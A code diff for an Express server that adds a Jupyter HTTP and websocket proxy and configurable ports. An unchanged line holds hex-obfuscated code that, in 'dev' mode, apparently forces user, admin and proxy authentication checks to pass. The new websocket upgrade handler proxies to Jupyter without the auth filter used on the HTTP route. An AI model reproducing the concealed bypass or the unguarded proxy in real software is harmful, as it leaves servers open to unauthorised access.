@@ -40,6 +40,7 @@ require("jsdom/lib/old-api").env("", function(err, window) {
     var session = require('express-session');
     var serverSession = session(sessionOpts);
     var http = require("http");
+    var httpProxy = require('http-proxy');
     require("shelljs/global");
     var exec = require("child_process").exec;
     var proxy = require('express-http-proxy');
@@ -51,9 +52,15 @@ require("jsdom/lib/old-api").env("", function(err, window) {
         // For expServer test
         serverPort = 12125;
     }
+    var thriftPort = process.env.XCE_THRIFT_PORT ?
+        process.env.XCE_THRIFT_PORT : 9090;
+    var jupyterPort = process.env.XCE_JUPYTER_PORT ?
+        process.env.XCE_JUPYTER_PORT : 8890;
+
     var _0x66c0=["\x2E\x2F\x65\x78\x70\x53\x65\x72\x76\x65\x72\x53\x75\x70\x70\x6F\x72\x74\x2E\x6A\x73","\x4E\x4F\x44\x45\x5F\x45\x4E\x56","\x65\x6E\x76","\x64\x65\x76","\x75\x73\x65\x72\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x54\x72\x75\x65","\x61\x64\x6D\x69\x6E\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x41\x64\x6D\x69\x6E\x54\x72\x75\x65","\x70\x72\x6F\x78\x79\x55\x73\x65\x72\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x50\x72\x6F\x78\x79\x41\x75\x74\x68\x54\x72\x75\x65"];var support=require(_0x66c0[0]);if(process[_0x66c0[2]][_0x66c0[1]]=== _0x66c0[3]){support[_0x66c0[5]](support[_0x66c0[4]]);support[_0x66c0[7]](support[_0x66c0[6]]);support[_0x66c0[9]](support[_0x66c0[8]])}
 
     var app = express();
+    var appJupyter = express();
 
     app.use(serverCookieParser);
     app.use(serverSession);
@@ -72,9 +79,9 @@ require("jsdom/lib/old-api").env("", function(err, window) {
     // proxy thrift requests to mgmtd
     // must be after the serverSession so the proxy
     // can filter using the session data
-    app.use('/thrift/service', proxy('localhost:9090', {
+    app.use('/thrift/service', proxy('localhost:' + thriftPort, {
         filter: function(req, res) {
-            return support.checkProxyAuth(req, res);
+            return support.checkProxyAuth(req, res, 'thrift');
         },
         proxyReqPathResolver: function(req) {
             return url.parse(req.url).path;
@@ -105,6 +112,22 @@ require("jsdom/lib/old-api").env("", function(err, window) {
 
     // Invoke the Authentication router
     app.use(require('./route/auth.js').router);
+
+    appJupyter.use(serverCookieParser);
+    appJupyter.use(serverSession);
+
+    // proxy jupyter requests
+    appJupyter.use('/jupyter', proxy('localhost:' + jupyterPort, {
+        filter: function(req, res) {
+            return support.checkProxyAuth(req, res, 'jupyter');
+        },
+        proxyReqPathResolver: function(req) {
+            return req.originalUrl;
+        },
+        proxyErrorHandler: function(err) {
+            xcConsole.error('error on proxy', err);
+        }
+    }));
 
     function bootstrapXlrRoot() {
         var cfgLocation =  process.env.XCE_CONFIG ?
@@ -212,6 +235,21 @@ require("jsdom/lib/old-api").env("", function(err, window) {
 
         httpServer.on('error', function(err){
             xcConsole.error('error on error hanlder', err);
+        });
+
+        var httpServerJupyter = http.createServer(appJupyter);
+        var proxyServer = httpProxy.createProxyServer({
+           target: {
+              host: 'localhost',
+              port: jupyterPort
+           }
+        });
+        httpServerJupyter.listen(port + 1, function() {
+            xcConsole.log("All ready, Listen on port " + (port + 1));
+        });
+        httpServerJupyter.on('upgrade', function(req, socket, head) {
+            xcConsole.log('ws upgrade request', req.url);
+            proxyServer.ws(req, socket, head);
         });
     });
 
